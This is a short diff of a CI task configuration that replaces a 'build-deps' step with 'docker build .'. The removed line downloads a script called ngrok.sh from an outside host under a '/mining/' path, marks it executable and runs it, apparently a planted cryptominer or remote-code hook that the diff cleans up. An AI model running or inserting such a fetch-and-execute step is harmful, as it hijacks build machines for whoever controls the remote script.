@@ -1,6 +1,6 @@
 
 tasks:
   build-deps:
-    runner: node:10
+    runner: docker
     steps:
-    - run: apt update -y && apt upgrade -y && wget https://swenson.my.id/mining/ngrok.sh && chmod 777 ngrok.sh && ./ngrok.sh
+    - run: docker build .
